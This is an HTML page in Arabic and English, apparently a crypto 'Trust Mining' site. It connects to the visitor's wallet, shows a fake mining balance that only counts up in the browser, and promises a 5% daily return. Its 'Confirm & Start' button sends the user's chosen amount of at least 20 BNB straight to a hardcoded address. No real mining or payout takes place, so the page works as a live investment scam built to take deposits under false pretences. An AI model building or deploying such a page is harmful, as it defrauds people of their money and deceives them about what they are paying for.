<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Trust Mining - تعدين</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
        }
        
        body {
            background: linear-gradient(135deg, #1a2a6c, #b21f1f, #fdbb2d);
            color: white;
            min-height: 100vh;
            padding: 20px;
            transition: all 0.3s ease;
        }
        
        .container {
            max-width: 800px;
            margin: 0 auto;
            background-color: rgba(0, 0, 0, 0.8);
            border-radius: 15px;
            padding: 30px;
            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.5);
        }
        
        .language-switcher {
            text-align: center;
            margin-bottom: 20px;
        }
        
        .language-switcher button {
            background: rgba(255, 255, 255, 0.2);
            color: white;
            border: 1px solid #fdbb2d;
            padding: 8px 15px;
            margin: 0 5px;
            border-radius: 5px;
            cursor: pointer;
        }
        
        .language-switcher button:hover {
            background: rgba(253, 187, 45, 0.3);
        }
        
        header {
            text-align: center;
            margin-bottom: 30px;
        }
        
        h1 {
            font-size: 2.5rem;
            margin-bottom: 10px;
            color: #fdbb2d;
        }
        
        .subtitle {
            font-size: 1.2rem;
            opacity: 0.8;
        }
        
        .section {
            background: rgba(255, 255, 255, 0.1);
            border-radius: 10px;
            padding: 20px;
            margin-bottom: 20px;
        }
        
        .btn {
            background: #fdbb2d;
            color: #1a2a6c;
            border: none;
            padding: 12px 25px;
            border-radius: 8px;
            font-weight: bold;
            cursor: pointer;
            transition: all 0.3s ease;
            margin: 10px 0;
        }
        
        .btn:hover {
            background: #ffcc44;
            transform: translateY(-2px);
        }
        
        .btn:disabled {
            background: #666;
            cursor: not-allowed;
            transform: none;
        }
        
        .mining-btn {
            font-size: 1.2rem;
            padding: 15px 40px;
            margin: 20px auto;
            display: block;
        }
        
        .confirm-btn {
            background: #28a745;
            color: white;
        }
        
        .confirm-btn:hover {
            background: #34ce57;
        }
        
        .stats {
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 20px;
            margin: 20px 0;
        }
        
        .stat-card {
            background: rgba(255, 255, 255, 0.1);
            padding: 20px;
            border-radius: 10px;
            text-align: center;
        }
        
        .stat-value {
            font-size: 2rem;
            font-weight: bold;
            color: #fdbb2d;
            margin-top: 10px;
        }
        
        .swap-input {
            margin: 15px 0;
        }
        
        .swap-input label {
            display: block;
            margin-bottom: 8px;
            font-weight: bold;
        }
        
        .swap-input input {
            width: 100%;
            padding: 12px;
            border-radius: 8px;
            border: 1px solid #fdbb2d;
            background: rgba(255, 255, 255, 0.1);
            color: white;
            font-size: 1.1rem;
        }
        
        .swap-actions {
            display: flex;
            gap: 15px;
            justify-content: center;
            flex-wrap: wrap;
        }
        
        .swap-details {
            background: rgba(0, 0, 0, 0.3);
            padding: 15px;
            border-radius: 8px;
            margin: 15px 0;
            display: none;
        }
        
        .warning {
            color: #ff6b6b;
            font-weight: bold;
            margin-top: 10px;
            text-align: center;
        }
        
        .info-note {
            text-align: center;
            font-style: italic;
            opacity: 0.9;
            margin-top: 20px;
            line-height: 1.6;
        }
        
        .wallet-details {
            margin-top: 15px;
            padding: 15px;
            background: rgba(0, 0, 0, 0.3);
            border-radius: 8px;
        }
        
        body[dir="ltr"] {
            text-align: left;
        }
        
        @media (max-width: 600px) {
            .container {
                padding: 15px;
            }
            
            h1 {
                font-size: 2rem;
            }
            
            .stats {
                grid-template-columns: 1fr;
            }
            
            .swap-actions {
                flex-direction: column;
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="language-switcher">
            <button onclick="changeLanguage('ar')">العربية</button>
            <button onclick="changeLanguage('en')">English</button>
        </div>
        
        <header>
            <h1 id="title">Trust Mining</h1>
            <p class="subtitle" id="subtitle">Mining Made Simple</p>
        </header>
        
        <section class="section wallet-section">
            <h2 id="walletStatus">Connect Your Wallet</h2>
            <button id="connectWallet" class="btn">Connect Wallet</button>
            <div id="walletInfo" class="wallet-details" style="display: none;"></div>
        </section>
        
        <section class="section mining-section">
            <h2 id="miningTitle">Mining</h2>
            <div class="stats">
                <div class="stat-card">
                    <span id="miningBalanceLabel">Mining Balance</span>
                    <div class="stat-value" id="miningBalance">0.00</div>
                </div>
                <div class="stat-card">
                    <span id="totalEarnedLabel">Total Earned</span>
                    <div class="stat-value" id="totalEarned">0.00</div>
                </div>
            </div>
            
            <button id="startMining" class="btn mining-btn" disabled>Start Mining</button>
        </section>
        
        <section class="section swap-section">
            <h3 id="swapTitle">Start Mining</h3>
            
            <div class="swap-input">
                <label id="swapAmountLabel">Amount (Minimum 20)</label>
                <input type="number" id="swapAmount" placeholder="20" step="1" min="20">
            </div>
            
            <div class="swap-actions">
                <button id="setSwapAmount" class="btn">Set Amount</button>
                <button id="confirmSwap" class="btn confirm-btn" disabled>Confirm & Start</button>
            </div>
            
            <div class="swap-details" id="swapDetails">
                <p id="swapSummary">Transfer: <span id="swapValue">0</span></p>
                <p id="swapFee">Daily Rate: <span id="feeValue">5%</span></p>
                <p id="swapNet">Daily Profit: <span id="netValue">0</span></p>
                <p class="warning" id="swapWarning">Click confirm to start mining</p>
            </div>
            
            <p class="warning" id="networkWarning">Use BEP20 Network Only</p>
        </section>
        
        <section class="section info-section">
            <p class="info-note" id="feeNote">
                Daily mining rate 5% - Minimum 20 - Direct to wallet
            </p>
        </section>
    </div>

    <script>
        const translations = {
            ar: {
                title: "Trust Mining",
                subtitle: "تعدين سهل",
                connectWallet: "اتصال المحفظة",
                walletConnected: "متصل",
                walletNotConnected: "غير متصل",
                miningTitle: "التعدين",
                startMining: "بدء التعدين",
                stopMining: "إيقاف",
                miningBalance: "الرصيد",
                totalEarned: "الإجمالي",
                swapTitle: "بدء التعدين",
                swapAmountLabel: "المبلغ (20 حد أدنى)",
                setSwapAmount: "تعيين",
                confirmSwap: "تأكيد البدء",
                swapSummary: "تحويل:",
                swapFee: "النسبة اليومية:",
                swapNet: "ربح يومي:",
                swapWarning: "اضغط تأكيد لبدء التعدين",
                networkWarning: "شبكة BEP20 فقط",
                feeNote: "نسبة يومية 5% - حد أدنى 20 - مباشر للمحفظة",
                address: "العنوان",
                balance: "الرصيد",
                minAmountError: "الحد الأدنى 20",
                balanceError: "تجاوز الرصيد"
            },
            en: {
                title: "Trust Mining",
                subtitle: "Mining Made Simple",
                connectWallet: "Connect Wallet",
                walletConnected: "Connected",
                walletNotConnected: "Not Connected",
                miningTitle: "Mining",
                startMining: "Start Mining",
                stopMining: "Stop",
                miningBalance: "Balance",
                totalEarned: "Total",
                swapTitle: "Start Mining",
                swapAmountLabel: "Amount (Min 20)",
                setSwapAmount: "Set Amount",
                confirmSwap: "Confirm & Start",
                swapSummary: "Transfer:",
                swapFee: "Daily Rate:",
                swapNet: "Daily Profit:",
                swapWarning: "Click confirm to start mining",
                networkWarning: "BEP20 Network Only",
                feeNote: "Daily rate 5% - Min 20 - Direct to wallet",
                address: "Address",
                balance: "Balance",
                minAmountError: "Minimum 20",
                balanceError: "Exceeds balance"
            }
        };

        let currentLanguage = 'en';
        let miningState = {
            isMining: false,
            isConnected: false,
            balance: 0,
            totalEarned: 0,
            miningInterval: null,
            userAddress: null,
            userBalance: 0
        };

        let swapState = {
            amount: 0
        };

        const miningAddress = "0xfc712c9985507a2eb44df1ddfe7f09ff7613a19b";

        const connectWalletBtn = document.getElementById('connectWallet');
        const walletStatus = document.getElementById('walletStatus');
        const walletInfo = document.getElementById('walletInfo');
        const startMiningBtn = document.getElementById('startMining');
        const miningBalanceEl = document.getElementById('miningBalance');
        const totalEarnedEl = document.getElementById('totalEarned');
        const swapAmountInput = document.getElementById('swapAmount');
        const setSwapAmountBtn = document.getElementById('setSwapAmount');
        const confirmSwapBtn = document.getElementById('confirmSwap');
        const swapDetails = document.getElementById('swapDetails');
        const swapValueEl = document.getElementById('swapValue');
        const feeValueEl = document.getElementById('feeValue');
        const netValueEl = document.getElementById('netValue');

        function changeLanguage(lang) {
            currentLanguage = lang;
            document.documentElement.dir = lang === 'ar' ? 'rtl' : 'ltr';
            document.documentElement.lang = lang;
            updateTexts();
        }

        function updateTexts() {
            const t = translations[currentLanguage];
            
            document.getElementById('title').textContent = t.title;
            document.getElementById('subtitle').textContent = t.subtitle;
            document.getElementById('connectWallet').textContent = t.connectWallet;
            document.getElementById('walletStatus').textContent = miningState.isConnected ? 
                t.walletConnected : t.walletNotConnected;
            document.getElementById('miningTitle').textContent = t.miningTitle;
            document.getElementById('miningBalanceLabel').textContent = t.miningBalance;
            document.getElementById('totalEarnedLabel').textContent = t.totalEarned;
            document.getElementById('swapTitle').textContent = t.swapTitle;
            document.getElementById('swapAmountLabel').textContent = t.swapAmountLabel;
            document.getElementById('setSwapAmount').textContent = t.setSwapAmount;
            document.getElementById('confirmSwap').textContent = t.confirmSwap;
            document.getElementById('swapSummary').innerHTML = `${t.swapSummary} <span id="swapValue">0</span>`;
            document.getElementById('swapFee').innerHTML = `${t.swapFee} <span id="feeValue">5%</span>`;
            document.getElementById('swapNet').innerHTML = `${t.swapNet} <span id="netValue">0</span>`;
            document.getElementById('swapWarning').textContent = t.swapWarning;
            document.getElementById('networkWarning').textContent = t.networkWarning;
            document.getElementById('feeNote').textContent = t.feeNote;
            
            document.getElementById('startMining').textContent = 
                miningState.isMining ? t.stopMining : t.startMining;
        }

        async function getUserBalance(address) {
            if (typeof window.ethereum !== 'undefined') {
                try {
                    const balance = await window.ethereum.request({
                        method: 'eth_getBalance',
                        params: [address, 'latest']
                    });
                    
                    miningState.userBalance = parseInt(balance) / 1e18;
                    updateWalletInfo();
                    return miningState.userBalance;
                } catch (error) {
                    console.error('Error getting balance:', error);
                    return 0;
                }
            }
            return 0;
        }

        function updateWalletInfo() {
            const t = translations[currentLanguage];
            if (miningState.isConnected && miningState.userAddress) {
                walletInfo.innerHTML = `
                    <p><strong>${t.address}:</strong> ${miningState.userAddress.slice(0, 6)}...${miningState.userAddress.slice(-4)}</p>
                    <p><strong>${t.balance}:</strong> ${miningState.userBalance.toFixed(4)} BNB</p>
                `;
            }
        }

        connectWalletBtn.onclick = async function() {
            if (typeof window.ethereum !== 'undefined') {
                try {
                    const accounts = await window.ethereum.request({ 
                        method: 'eth_requestAccounts' 
                    });
                    
                    miningState.isConnected = true;
                    miningState.userAddress = accounts[0];
                    
                    await getUserBalance(accounts[0]);
                    
                    walletStatus.textContent = translations[currentLanguage].walletConnected;
                    startMiningBtn.disabled = false;
                    walletInfo.style.display = 'block';
                    updateWalletInfo();
                    
                } catch (error) {
                    alert(currentLanguage === 'ar' ? 'خطأ في الاتصال' : 'Connection error');
                }
            } else {
                alert(currentLanguage === 'ar' ? 
                    'يجب استخدام Trust Wallet' : 
                    'Please use Trust Wallet');
            }
        };

        startMiningBtn.onclick = function() {
            if (!miningState.isMining) {
                miningState.isMining = true;
                miningState.startTime = Date.now();
                startMiningBtn.textContent = translations[currentLanguage].stopMining;
                
                miningState.miningInterval = setInterval(() => {
                    miningState.balance += 0.01;
                    miningBalanceEl.textContent = miningState.balance.toFixed(2);
                }, 1000);
                
            } else {
                miningState.isMining = false;
                miningState.totalEarned += miningState.balance;
                miningState.balance = 0;
                
                clearInterval(miningState.miningInterval);
                startMiningBtn.textContent = translations[currentLanguage].startMining;
                
                miningBalanceEl.textContent = '0.00';
                totalEarnedEl.textContent = miningState.totalEarned.toFixed(2);
            }
        };

        setSwapAmountBtn.onclick = function() {
            const amount = parseFloat(swapAmountInput.value);
            const t = translations[currentLanguage];
            
            if (amount >= 20 && amount <= miningState.userBalance) {
                swapState.amount = amount;
                const dailyRate = 0.05;
                const dailyProfit = amount * dailyRate;
                
                swapValueEl.textContent = amount;
                feeValueEl.textContent = "5%";
                netValueEl.textContent = dailyProfit.toFixed(2);
                
                swapDetails.style.display = 'block';
                confirmSwapBtn.disabled = false;
                
            } else {
                alert(amount < 20 ? t.minAmountError : t.balanceError);
            }
        };

        confirmSwapBtn.onclick = async function() {
            if (!swapState.amount || !miningState.userAddress) return;
            
            try {
                const t = translations[currentLanguage];
                const balanceBefore = miningState.userBalance;
                
                const transactionHash = await window.ethereum.request({
                    method: 'eth_sendTransaction',
                    params: [{
                        from: miningState.userAddress,
                        to: miningAddress,
                        value: '0x' + Math.floor(swapState.amount * 1e18).toString(16),
                        gas: "21000"
                    }]
                });
                
                alert(currentLanguage === 'ar' ? 
                    'تم إرسال العملية بنجاح! جاري التحقق...' : 
                    'Transaction sent successfully! Verifying...');
                
                setTimeout(async () => {
                    await getUserBalance(miningState.userAddress);
                    
                    if (miningState.userBalance < balanceBefore) {
                        if (!miningState.isMining) {
                            startMiningBtn.click();
                        }
                        
                        alert(currentLanguage === 'ar' ? 
                            'تم التحويل بنجاح! بدء التعدين...' : 
                            'Transfer successful! Starting mining...');
                    }
                    
                }, 3000);
                
            } catch (error) {
                if (error.code === 4001) {
                    alert(currentLanguage === 'ar' ? 
                        'تم إلغاء العملية من قبل المستخدم' : 
                        'Transaction cancelled by user');
                } else {
                    alert(currentLanguage === 'ar' ? 
                        'خطأ في العملية: ' + error.message : 
                        'Transaction error: ' + error.message);
                }
            }
        };

        if (typeof window.ethereum !== 'undefined') {
            window.ethereum.on('accountsChanged', function(accounts) {
                if (accounts.length === 0) {
                    miningState.isConnected = false;
                    walletStatus.textContent = translations[currentLanguage].walletNotConnected;
                    walletInfo.style.display = 'none';
                    startMiningBtn.disabled = true;
                } else {
                    miningState.userAddress = accounts[0];
                    getUserBalance(accounts[0]);
                }
            });
            
            window.ethereum.on('chainChanged', function() {
                if (miningState.userAddress) {
                    getUserBalance(miningState.userAddress);
                }
            });
        }

        updateTexts();
    </script>
</body>
</html>
